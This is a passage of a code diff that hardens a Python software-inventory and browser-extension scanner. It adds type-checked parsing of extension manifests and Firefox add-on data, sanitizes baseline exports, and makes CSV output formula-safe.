             if name.startswith("__MSG_"):
                 name = self._get_localized_name(manifest_path.parent, name) or name
 
-            version = manifest.get("version", "")
-            description = manifest.get("description", "")
+            version = self._as_text(manifest.get("version"))
+            description = self._as_text(manifest.get("description"))
             if description.startswith("__MSG_"):
                 description = ""  # Skip localized descriptions for simplicity
 
             # Gather permissions from multiple sources
             permissions = []
-            permissions.extend(manifest.get("permissions", []))
-            permissions.extend(manifest.get("host_permissions", []))
-            permissions.extend(manifest.get("optional_permissions", []))
+            for field_name in ("permissions", "host_permissions", "optional_permissions"):
+                permissions.extend(self._permission_strings(manifest.get(field_name)))
 
             # Get content script matches as well (these are effectively permissions)
-            for content_script in manifest.get("content_scripts", []):
-                permissions.extend(content_script.get("matches", []))
+            content_scripts = manifest.get("content_scripts")
+            if isinstance(content_scripts, list):
+                for content_script in content_scripts:
+                    if isinstance(content_script, dict):
+                        permissions.extend(self._permission_strings(content_script.get("matches")))
+        except (TypeError, ValueError, AttributeError) as e:
+            # Backstop: still report the extension rather than dropping it
+            logger.debug(f"Could not fully parse {manifest_path}: {e}")
+            return BrowserExtensionInfo(name=ext_id, version="", browser=browser, extension_id=ext_id,
+                                        description="(manifest could not be parsed)")
 
-            return BrowserExtensionInfo(
-                name=name,
-                version=version,
-                browser=browser,
-                extension_id=ext_id,
-                description=description[:100] if description else "",
-                permissions=permissions,
-            )
+        return BrowserExtensionInfo(
+            name=name,
+            version=version,
+            browser=browser,
+            extension_id=ext_id,
+            description=description[:100],
+            permissions=permissions,
+        )
 
-        except (json.JSONDecodeError, KeyError, OSError):
-            return None
+    @staticmethod
+    def _as_text(value) -> str:
+        """Return a manifest field as text ("" for None); untrusted fields may not be strings."""
+        if value is None:
+            return ""
+        return value if isinstance(value, str) else str(value)
+
+    @staticmethod
+    def _permission_strings(value) -> list[str]:
+        """Return a permission list as strings. Dict entries (e.g. Chrome app
+        {"fileSystem": [...]}) contribute their keys; anything that isn't a list gives []."""
+        if not isinstance(value, list):
+            return []
+        result = []
+        for item in value:
+            if isinstance(item, str):
+                result.append(item)
+            elif isinstance(item, dict):
+                result.extend(str(k) for k in item)
+            elif item is not None:
+                result.append(str(item))
+        return result
 
     def _get_localized_name(self, ext_dir: Path, msg_key: str) -> Optional[str]:
         """Try to get the localized name from _locales directory."""
@@ -1189,13 +1731,16 @@ class BrowserExtensionScanner:
             try:
                 with open(messages_path, "r", encoding="utf-8") as f:
                     messages = json.load(f)
-                # Try both lowercase and original case
-                for k in [key, key.lower()]:
-                    if k in messages and "message" in messages[k]:
-                        return messages[k]["message"]
-            except (json.JSONDecodeError, OSError):
-                # File doesn't exist or can't be parsed - try next locale
+            except (OSError, ValueError, RecursionError):
+                # Missing, invalid UTF-8 / JSON (UnicodeDecodeError is a ValueError), or too deep
                 continue
+            if not isinstance(messages, dict):
+                continue
+            # Try both lowercase and original case
+            for k in (key, key.lower()):
+                entry = messages.get(k)
+                if isinstance(entry, dict) and isinstance(entry.get("message"), str):
+                    return entry["message"]
 
         return None
 
@@ -1227,54 +1772,71 @@ class BrowserExtensionScanner:
     def _parse_firefox_extensions_json(
         self, extensions_json: Path
     ) -> list[BrowserExtensionInfo]:
-        """Parse Firefox's extensions.json file."""
+        """Parse Firefox's extensions.json file.
+
+        The file is untrusted: each add-on entry is type-checked and parsed separately,
+        so one malformed entry can't drop the rest of the profile's add-ons.
+        """
         extensions = []
 
         try:
             with open(extensions_json, "r", encoding="utf-8", errors="replace") as f:
                 data = json.load(f)
+        except (OSError, ValueError, RecursionError):
+            return extensions
 
-            for addon in data.get("addons", []):
-                # Skip system/built-in addons
-                if addon.get("location") in ["app-system-defaults", "app-builtin"]:
-                    continue
+        addons = data.get("addons") if isinstance(data, dict) else None
+        if not isinstance(addons, list):
+            return extensions
 
-                addon_type = addon.get("type", "")
-                if addon_type != "extension":
-                    continue
-
-                name = addon.get("defaultLocale", {}).get("name", "")
-                if not name:
-                    name = addon.get("id", "Unknown")
-
-                version = addon.get("version", "")
-                ext_id = addon.get("id", "")
-                description = addon.get("defaultLocale", {}).get("description", "")
-                active = addon.get("active", True)
-
-                # Firefox stores permissions differently
-                permissions = addon.get("userPermissions", {}).get("permissions", [])
-                origins = addon.get("userPermissions", {}).get("origins", [])
-                permissions.extend(origins)
-                # Also check top-level permissions (legacy/MV3 format)
-                top_perms = addon.get("permissions", [])
-                if isinstance(top_perms, list):
-                    permissions.extend(top_perms)
-
-                extensions.append(BrowserExtensionInfo(
-                    name=name,
-                    version=version,
-                    browser="Firefox",
-                    extension_id=ext_id,
-                    description=description[:100] if description else "",
-                    permissions=permissions,
-                    enabled=active,
-                ))
-
-        except (json.JSONDecodeError, KeyError, OSError):
-            pass
+        for addon in addons:
+            try:
+                ext = self._parse_firefox_addon(addon)
+            except (TypeError, ValueError, AttributeError) as e:
+                logger.debug(f"Skipped unreadable add-on entry in {extensions_json}: {e}")
+                continue
+            if ext:
+                extensions.append(ext)
 
         return extensions
+
+    def _parse_firefox_addon(self, addon) -> Optional[BrowserExtensionInfo]:
+        """Parse one entry of extensions.json["addons"]; None if it isn't a user extension."""
+        if not isinstance(addon, dict):
+            return None
+
+        # Skip system/built-in addons
+        if addon.get("location") in ("app-system-defaults", "app-builtin"):
+            return None
+        if addon.get("type") != "extension":
+            return None
+
+        locale = addon.get("defaultLocale")
+        if not isinstance(locale, dict):
+            locale = {}
+        user_permissions = addon.get("userPermissions")   # can be null in real files
+        if not isinstance(user_permissions, dict):
+            user_permissions = {}
+
+        ext_id = self._as_text(addon.get("id"))
+        name = self._as_text(locale.get("name")) or ext_id or "Unknown"
+        description = self._as_text(locale.get("description"))
+        active = addon.get("active", True)
+
+        # Firefox stores permissions differently; also check top-level permissions (legacy/MV3)
+        permissions = (self._permission_strings(user_permissions.get("permissions"))
+                       + self._permission_strings(user_permissions.get("origins"))
+                       + self._permission_strings(addon.get("permissions")))
+
+        return BrowserExtensionInfo(
+            name=name,
+            version=self._as_text(addon.get("version")),
+            browser="Firefox",
+            extension_id=ext_id,
+            description=description[:100],
+            permissions=permissions,
+            enabled=active if isinstance(active, bool) else True,
+        )
 
     def display_extensions_table(
         self, extensions: list[BrowserExtensionInfo]
@@ -1975,13 +2537,17 @@ class SoftwareExporter:
 
     @staticmethod
     def _sanitize_software_dict(software: SoftwareInfo) -> dict:
-        """Convert SoftwareInfo to dict with sanitized string fields."""
+        """Convert SoftwareInfo to dict with sanitized string fields.
+
+        Every field is sanitized: entries can come from a baseline file on disk,
+        where even install_date and source are untrusted.
+        """
         return {
             "name": sanitize_output(software.name),
             "version": sanitize_output(software.version),
             "publisher": sanitize_output(software.publisher),
-            "install_date": software.install_date,
-            "source": software.source,
+            "install_date": sanitize_output(software.install_date),
+            "source": sanitize_output(software.source),
             "install_location": sanitize_output(software.install_location),
         }
 
@@ -2025,7 +2591,8 @@ class SoftwareExporter:
         writer.writeheader()
 
         for software in software_list:
-            writer.writerow(SoftwareExporter._sanitize_software_dict(software))
+            row = SoftwareExporter._sanitize_software_dict(software)
+            writer.writerow({k: csv_safe_cell(v) for k, v in row.items()})
 
         return output.getvalue()
 
@@ -2221,19 +2788,72 @@ class BaselineManager:
         return diff
 
     @staticmethod
+    def diff_to_json(diff: BaselineDiff, baseline_metadata: dict, baseline_file: str) -> str:
+        """Render a baseline diff as JSON, with every string field sanitized."""
+        sanitize = SoftwareExporter._sanitize_software_dict
+        diff_data = {
+            "metadata": {
+                "generated_at": datetime.now().isoformat(),
+                "baseline_file": sanitize_output(baseline_file),
+                "baseline_created": sanitize_output(baseline_metadata.get("created_at")),
+                "baseline_hostname": sanitize_output(baseline_metadata.get("hostname")),
+            },
+            "summary": {
+                "added_count": len(diff.added),
+                "removed_count": len(diff.removed),
+                "changed_count": len(diff.changed),
+                "total_changes": diff.total_changes,
+            },
+            "added": [sanitize(s) for s in diff.added],
+            "removed": [sanitize(s) for s in diff.removed],
+            "changed": [
+                {"baseline": sanitize(b), "current": sanitize(c)}
+                for b, c in diff.changed
+            ],
+        }
+        return json.dumps(diff_data, indent=2, ensure_ascii=False)
+
+    @staticmethod
+    def diff_to_csv(diff: BaselineDiff) -> str:
+        """Render a baseline diff as CSV, with every field sanitized and formula-safe.
+
+        Columns: change_type, name, baseline_version, current_version, publisher, source
+        """
+        output = io.StringIO()
+        writer = csv.writer(output, quoting=csv.QUOTE_ALL)
+        writer.writerow(["change_type", "name", "baseline_version", "current_version", "publisher", "source"])
+
+        def row(change_type, name, baseline_version, current_version, publisher, source):
+            writer.writerow([change_type] + [csv_safe_cell(v) for v in
+                            (name, baseline_version, current_version, publisher, source)])
+
+        for s in diff.added:
+            row("added", s.name, "", s.version, s.publisher, s.source)
+        for s in diff.removed:
+            row("removed", s.name, s.version, "", s.publisher, s.source)
+        for b, c in diff.changed:
+            row("changed", c.name, b.version, c.version, c.publisher, c.source)
+
+        return output.getvalue()
+
+    @staticmethod
     def display_diff(diff: BaselineDiff, baseline_metadata: dict) -> None:
         """Display baseline comparison results.
 
         Args:
             diff: BaselineDiff object
-            baseline_metadata: Metadata from the baseline file
+            baseline_metadata: Metadata from the baseline file (untrusted; sanitized on display)
         """
+        def meta(key: str) -> str:
+            value = baseline_metadata.get(key)
+            return "unknown" if value is None else sanitize_output(value)
+
         print("=" * 70)
         print("BASELINE COMPARISON RESULTS")
         print("=" * 70)
-        print(f"Baseline created: {baseline_metadata.get('created_at', 'unknown')}")
-        print(f"Baseline host: {baseline_metadata.get('hostname', 'unknown')}")
-        print(f"Baseline software count: {baseline_metadata.get('software_count', 'unknown')}")
+        print(f"Baseline created: {meta('created_at')}")
+        print(f"Baseline host: {meta('hostname')}")
+        print(f"Baseline software count: {meta('software_count')}")
         print("=" * 70)
 
         if not diff.has_changes:
@@ -2255,7 +2875,7 @@ class BaselineManager:
                     print(f"      Version: {sanitize_output(software.version)}")
                 if software.publisher:
                     print(f"      Publisher: {sanitize_output(software.publisher)}")
-                print(f"      Source: {software.source}")
+                print(f"      Source: {sanitize_output(software.source)}")
 
         if diff.removed:
             print("\n" + "-" * 70)
@@ -2287,6 +2907,7 @@ class BaselineManager:
 
 def main():
     """Main entry point for the CLI."""
+    _harden_process_environment()
     setup_console_encoding()
 
     parser = argparse.ArgumentParser(
@@ -2416,7 +3037,14 @@ Examples:
     args.cve_limit = max(1, min(args.cve_limit, 100))
 
     # Setup logging before any operations
-    setup_logging(log_file=args.log_file, verbose=args.verbose)
+    try:
+        setup_logging(log_file=args.log_file, verbose=args.verbose)
+    except LogFileOwnershipError as e:
+        print(f"Error: {sanitize_output(str(e))}", file=sys.stderr)
+        sys.exit(EXIT_PERMISSION_DENIED)
+    except PermissionError:
+        print(f"Error: cannot create or write the log file: {sanitize_output(args.log_file)}", file=sys.stderr)
+        sys.exit(EXIT_PERMISSION_DENIED)
 
     # Load API keys from .env files (won't overwrite existing env vars)
     _load_env_file()
@@ -2576,41 +3204,9 @@ Examples:
 
             # Output diff in requested format
             if args.output == "json":
-                diff_data = {
-                    "metadata": {
-                        "generated_at": datetime.now().isoformat(),
-                        "baseline_file": args.diff,
-                        "baseline_created": baseline_metadata.get("created_at"),
-                        "baseline_hostname": baseline_metadata.get("hostname"),
-                    },
-                    "summary": {
-                        "added_count": len(diff.added),
-                        "removed_count": len(diff.removed),
-                        "changed_count": len(diff.changed),
-                        "total_changes": diff.total_changes,
-                    },
-                    "added": [asdict(s) for s in diff.added],
-                    "removed": [asdict(s) for s in diff.removed],
-                    "changed": [
-                        {"baseline": asdict(b), "current": asdict(c)}
-                        for b, c in diff.changed
-                    ],
-                }
-                print(json.dumps(diff_data, indent=2, ensure_ascii=False))
+                print(BaselineManager.diff_to_json(diff, baseline_metadata, args.diff))
             elif args.output == "csv":
-                # CSV diff format: change_type, name, baseline_version, current_version
-                output = io.StringIO()
-                writer = csv.writer(output, quoting=csv.QUOTE_ALL)
-                writer.writerow(["change_type", "name", "baseline_version", "current_version", "publisher", "source"])
-
-                for s in diff.added:
-                    writer.writerow(["added", s.name, "", s.version, s.publisher, s.source])
-                for s in diff.removed:
-                    writer.writerow(["removed", s.name, s.version, "", s.publisher, s.source])
-                for b, c in diff.changed:
-                    writer.writerow(["changed", c.name, b.version, c.version, c.publisher, c.source])
-
-                print(output.getvalue())
+                print(BaselineManager.diff_to_csv(diff))
             else:
                 BaselineManager.display_diff(diff, baseline_metadata)
 
